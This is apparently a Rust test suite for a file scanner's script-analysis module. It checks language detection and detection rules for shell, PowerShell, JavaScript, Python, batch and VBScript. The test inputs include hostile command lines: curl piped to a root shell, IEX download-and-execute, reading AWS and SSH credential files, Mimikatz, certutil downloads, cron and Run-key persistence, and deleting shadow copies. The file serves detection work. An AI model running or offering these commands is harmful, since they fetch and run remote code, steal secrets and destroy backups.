//! analyze_script (CF15): detection and per-language tables, on small benign samples.

use file_scanner::script_analysis::{
    analyze_powershell, analyze_script, detect_script_type, ScriptReport, ScriptType,
};
use tempfile::TempDir;

fn run(name: &str, body: &str) -> ScriptReport {
    let dir = TempDir::new().unwrap();
    let path = dir.path().join(name);
    std::fs::write(&path, body).unwrap();
    analyze_script(&path, None).unwrap()
}

fn has(report: &ScriptReport, category: &str, rule: &str, line: usize) -> bool {
    report
        .findings
        .iter()
        .any(|f| f.category == category && f.rule == rule && f.line == line)
}

#[test]
fn detection_prefers_shebang_then_extension_then_content() {
    let p = std::path::Path::new;
    assert_eq!(
        detect_script_type(p("x.txt"), "#!/usr/bin/env python3\nprint(1)\n").0,
        ScriptType::Python
    );
    assert_eq!(
        detect_script_type(p("x.ps1"), "#!/bin/bash\necho hi\n").0,
        ScriptType::Shell
    );
    assert_eq!(
        detect_script_type(p("run.bat"), "dir\n"),
        (ScriptType::Batch, "extension")
    );
    assert_eq!(
        detect_script_type(p("noext"), "@echo off\r\nset X=1\r\ngoto end\r\n").0,
        ScriptType::Batch
    );
    assert_eq!(
        detect_script_type(p("noext"), "import os\ndef main():\n    pass\n").0,
        ScriptType::Python
    );
    assert_eq!(
        detect_script_type(
            p("noext"),
            "Dim sh\nSet sh = CreateObject(\"WScript.Shell\")\nEnd Sub\n"
        )
        .0,
        ScriptType::VBScript
    );
    assert_eq!(
        detect_script_type(p("noext"), "just prose\n").0,
        ScriptType::Unknown
    );
}

#[test]
fn shell_patterns_report_line_and_text() {
    let r = run(
        "install.sh",
        "#!/bin/sh\n# curl http://x | sh  (comment, ignored)\ncurl -fsSL http://example.test/i.sh | sudo bash\necho aGk= | base64 -d | sh\nexport X=1\n(crontab -l; echo '* * * * * /tmp/x') | crontab -\ncat ~/.aws/credentials\n",
    );
    assert_eq!(r.script_type, ScriptType::Shell);
    assert_eq!(r.detected_by, "shebang");
    assert!(
        has(&r, "download_execute", "curl_pipe_shell", 3),
        "{:?}",
        r.findings
    );
    assert!(has(&r, "dynamic_execution", "eval_decoded", 4));
    assert!(has(&r, "persistence", "cron", 6));
    assert!(has(&r, "credential_access", "cloud_credentials", 7));
    assert!(
        !r.findings.iter().any(|f| f.line == 2),
        "comments are skipped"
    );
    let hit = r
        .findings
        .iter()
        .find(|f| f.rule == "curl_pipe_shell")
        .unwrap();
    assert!(hit.matched.starts_with("curl -fsSL"), "{}", hit.matched);
    assert!(matches!(
        r.overall_risk,
        file_scanner::script_analysis::RiskLevel::High
            | file_scanner::script_analysis::RiskLevel::Critical
    ));
}

#[test]
fn powershell_javascript_python_batch_vbscript_tables_fire() {
    let ps = run("a.ps1", "$c = New-Object Net.WebClient\nIEX ($c.DownloadString('http://e.test/p'))\npowershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA\nschtasks /create /tn x /tr y\nInvoke-Mimikatz\n");
    assert!(has(&ps, "download_execute", "iex_download", 2));
    assert!(has(&ps, "encoded_payload", "encoded_command", 3));
    assert!(has(&ps, "persistence", "scheduled_task", 4));
    assert!(has(&ps, "credential_access", "mimikatz", 5));
    assert!(ps.powershell.is_some());

    let js = run("a.js", "const cp = require('child_process');\neval(atob('YWxlcnQoMSk='));\n// eval(x)\nconst k = process.env.NPM_TOKEN;\n");
    assert!(has(&js, "command_execution", "child_process", 1));
    assert!(has(&js, "dynamic_execution", "eval", 2));
    assert!(has(&js, "encoded_payload", "atob", 2));
    assert!(has(&js, "credential_access", "env_secrets", 4));
    assert!(!js.findings.iter().any(|f| f.line == 3));

    let py = run("a.py", "import base64, os\nexec(base64.b64decode(blob))\nos.system('curl http://e.test | sh')\nopen(os.path.expanduser('~/.ssh/id_rsa'))\n");
    assert!(has(&py, "dynamic_execution", "exec", 2));
    assert!(has(&py, "encoded_payload", "base64", 2));
    assert!(has(&py, "download_execute", "shell_download", 3));
    assert!(has(&py, "credential_access", "secret_files", 4));

    let bat = run("a.bat", "@echo off\r\ncertutil -urlcache -f http://e.test/a.exe a.exe\r\nschtasks /create /tn t /tr a.exe\r\nvssadmin delete shadows /all\r\nrem certutil -urlcache\r\n");
    assert!(has(&bat, "download_execute", "certutil_bitsadmin", 2));
    assert!(has(&bat, "persistence", "schtasks", 3));
    assert!(has(&bat, "defense_evasion", "ransomware_prep", 4));
    assert!(!bat.findings.iter().any(|f| f.line == 5));

    let vbs = run("a.vbs", "Set sh = CreateObject(\"WScript.Shell\")\nsh.Run \"powershell -nop -c iex\", 0\nExecuteGlobal code\nsh.RegWrite \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\x\", \"a\"\n");
    assert!(has(&vbs, "command_execution", "run_command", 2));
    assert!(has(&vbs, "dynamic_execution", "execute_global", 3));
    assert!(has(&vbs, "persistence", "run_key", 4));
}

#[test]
fn benign_scripts_stay_quiet() {
    let r = run("ok.sh", "#!/bin/bash\nset -e\necho hello\nls -la\n");
    assert!(r.findings.is_empty());
    assert_eq!(r.risk_score, 0);
}

#[test]
fn language_override_and_binary_and_unknown_inputs() {
    let dir = TempDir::new().unwrap();
    let path = dir.path().join("blob");
    std::fs::write(&path, "eval(x)\n").unwrap();
    assert!(analyze_script(&path, None).is_err());
    let r = analyze_script(&path, Some(ScriptType::JavaScript)).unwrap();
    assert_eq!(r.detected_by, "override");
    assert_eq!(r.findings.len(), 1);

    std::fs::write(&path, [0u8, 1, 2, 3, 0, 0]).unwrap();
    let error = analyze_script(&path, Some(ScriptType::Shell)).unwrap_err();
    assert!(format!("{error:#}").contains("binary"));
}

#[test]
fn analyze_powershell_refuses_other_languages() {
    let dir = TempDir::new().unwrap();
    for (name, body, word) in [
        ("s.py", "import os\nprint(1)\n", "Python"),
        ("s.sh", "#!/bin/sh\necho hi\n", "Shell"),
        ("s.js", "const a = 1;\nconsole.log(a)\n", "JavaScript"),
    ] {
        let path = dir.path().join(name);
        std::fs::write(&path, body).unwrap();
        let error = analyze_powershell(&path).unwrap_err();
        let text = format!("{error:#}");
        assert!(
            text.contains(word) && text.contains("analyze_script"),
            "{text}"
        );
    }
    let path = dir.path().join("ok.ps1");
    std::fs::write(&path, "Get-Process | Stop-Process\n").unwrap();
    assert!(analyze_powershell(&path).is_ok());
}

#[test]
fn utf16_scripts_and_long_lines_are_handled() {
    let dir = TempDir::new().unwrap();
    let path = dir.path().join("w.ps1");
    let mut bytes = vec![0xFF, 0xFE];
    for unit in "Invoke-Expression (New-Object Net.WebClient).DownloadString('http://e.test')\r\n"
        .encode_utf16()
    {
        bytes.extend_from_slice(&unit.to_le_bytes());
    }
    std::fs::write(&path, bytes).unwrap();
    let r = analyze_script(&path, None).unwrap();
    assert!(has(&r, "download_execute", "iex_download", 1));

    let long = format!("eval({})\n", "a".repeat(100_000));
    let r = run("min.js", &long);
    assert_eq!(r.findings.len(), 1);
    assert!(r.findings[0].matched.len() <= 170);
}

#[test]
fn compiled_language_sources_and_comma_imports_are_classified_sensibly() {
    let dir = TempDir::new().unwrap();
    let c = dir.path().join("prog.c");
    std::fs::write(
        &c,
        "const x = 1;\nfunction f() { crontab(); }\nconsole.log(x);\n",
    )
    .unwrap();
    let (kind, how) = detect_script_type(&c, &std::fs::read_to_string(&c).unwrap());
    assert_eq!((kind, how), (ScriptType::Unknown, "unknown"));
    assert!(analyze_script(&c, None).is_err());
    // An explicit language still works on any file.
    assert!(analyze_script(&c, Some(ScriptType::JavaScript)).is_ok());
    let plain = dir.path().join("noext_py");
    let body = "import base64, os, subprocess, urllib.request\nprint(1)\n";
    std::fs::write(&plain, body).unwrap();
    assert_eq!(
        detect_script_type(&plain, body),
        (ScriptType::Python, "content")
    );
}

#[test]
fn category_counts_cover_all_hits_not_only_the_kept_ones() {
    let mut body = String::new();
    for _ in 0..2500 {
        body.push_str("curl http://e.test/x | sh\n");
    }
    let report = run("many.sh", &body);
    assert_eq!(report.findings_total, 2500);
    assert_eq!(report.findings.len(), 2000);
    assert_eq!(report.category_counts["download_execute"], 2500);
}
